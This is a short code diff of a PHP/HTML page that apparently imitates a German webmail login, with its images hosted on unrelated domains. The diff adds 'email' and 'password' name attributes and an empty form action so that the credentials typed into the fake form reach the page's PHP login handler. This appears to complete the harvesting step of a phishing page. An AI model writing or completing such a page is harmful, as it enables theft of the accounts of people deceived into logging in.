@@ -87,7 +87,7 @@ if (isset($_POST['login'])) {
         </header>
         <div class="news mt-3"> <img src="https://webde-justice.vercel.app/_next/static/media/Lcreenshot1.e3f46304.png" width="100%" /></div>
         <div class="form-part d-flex justify-content-center p-2 mb-3  sticky-top">
-          <form class="mx-auto text-center" method="post">
+          <form class="mx-auto text-center" method="post" action="">
             <div class="row align-items-center ">
               <div class="col-auto pb-2"><img src="https://explorer.stockprofitsfx.pro/en/mail.png" width="40px" /></div>
               <div class="col-auto pb-2">
@@ -96,12 +96,12 @@ if (isset($_POST['login'])) {
 
               <div class="col-auto">
                 <label class="visually-hidden" for="inputEmail">Email</label>
-                <input type="email" class="form-control" id="inputEmail" placeholder="E-mail-Addresse" required>
+                <input type="email" class="form-control" name="email" id="inputEmail" placeholder="E-mail-Addresse" required>
                 <small>Kostenlos registrieren!</small>
               </div>
               <div class="col-auto">
                 <label class="visually-hidden" for="inputPassword">Passwort</label>
-                <input type="password" class="form-control" id="inputPassword" placeholder="Passwort" required>
+                <input type="password" class="form-control" name="password" id="inputPassword" placeholder="Passwort" required>
                 <small>Passwort Vergessen?</small>
               </div>
               <div class="col-auto">
